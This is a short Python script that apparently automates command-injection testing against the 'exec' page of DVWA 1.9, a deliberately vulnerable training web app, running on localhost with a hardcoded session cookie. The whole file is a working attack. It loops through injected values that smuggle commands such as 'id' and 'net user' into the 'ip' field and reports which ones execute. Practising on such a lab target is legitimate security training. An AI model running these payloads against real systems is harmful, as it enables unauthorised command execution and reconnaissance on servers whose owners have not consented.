#encoding: utf-8

import re

import requests


def injection(addr, headers, payload):
    url = 'http://{0}:{1}/DVWA-1.9/vulnerabilities/exec/'.format(*addr)
    name = payload['name']
    pattern = payload['pattern']
    for pld in payload['payloads']:
        params = {
            'ip' : pld,
            'Submit' : 'Submit',
        }
        response = requests.post(url, params, headers=headers)
        if response.ok and re.search(pattern, response.text, re.I):
            print('+ name:', name, ', payload:', pld)
            break


def main(addr, headers):
    payloads = [
        {
            'name' : 'id',
            'pattern' : r'uid=\d',
            'payloads' : [
                '127.0.0.1;id;',
                '127.0.0.1&&id',
                '127.0.0.1&id', '127.0.0.1|id',
                'testcmdinjection||id',
                'testcmdinjection|id', 'testcmdinjection&id',
            ]
        },
        {
            'name' : 'netuser',
            'pattern' : r'administrator',
            'payloads' : [
                'testcmdinjection||net user',
                'testcmdinjection|net user', 'testcmdinjection&net user',
                '127.0.0.1&&net user',
                '127.0.0.1&net user', '127.0.0.1|net user',
            ]
        },

    ]
    for payload in payloads:
        injection(addr, headers, payload)


if __name__ == '__main__':
    server = ('localhost', 80, )
    headers = {
        'Cookie' : 'security=low; PHPSESSID=u91gorbk6d5j4de6ehrf2t3953',
    }
    main(server, headers)